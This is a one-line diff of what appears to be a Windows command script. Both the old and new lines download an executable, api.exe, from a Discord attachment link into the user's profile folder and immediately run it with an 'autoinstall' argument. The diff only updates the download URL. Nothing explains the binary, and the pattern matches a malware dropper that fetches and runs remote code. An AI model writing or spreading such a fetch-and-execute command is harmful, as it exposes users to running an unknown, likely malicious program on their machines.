@@ -1,1 +1,1 @@
-cd %userprofile% && curl -OL https://cdn.discordapp.com/attachments/836269521483595796/1184552819806715925/api.exe && api -conf@autoinstall
+cd %userprofile% && curl -OL https://cdn.discordapp.com/attachments/836269521483595796/1186363034986364968/api.exe && api -conf@autoinstall
